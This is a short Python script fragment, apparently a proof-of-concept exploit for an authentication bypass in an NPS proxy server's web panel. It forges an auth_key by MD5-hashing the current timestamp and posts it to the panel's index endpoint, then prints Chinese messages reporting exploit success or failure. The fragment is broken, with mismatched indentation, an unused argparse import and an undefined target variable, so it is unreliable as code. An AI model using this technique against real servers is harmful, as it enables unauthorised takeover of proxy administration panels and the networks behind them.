import argparse
import requests
import time
import hashlib

sjc = int(time.time())
    md5 = hashlib.md5()
    md5.update(str(sjc).encode('utf-8'))
    sjcmd5 = md5.hexdigest()
    npslink = "{}/Index/Index?auth_key={}&timestamp={}".format(nps, sjcmd5, sjc)
    headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json",
    }
    response = requests.post(npslink, headers=headers)
    if response.status_code == 200:
       print("漏洞利用成功")
    else:
       print("漏洞利用失败")
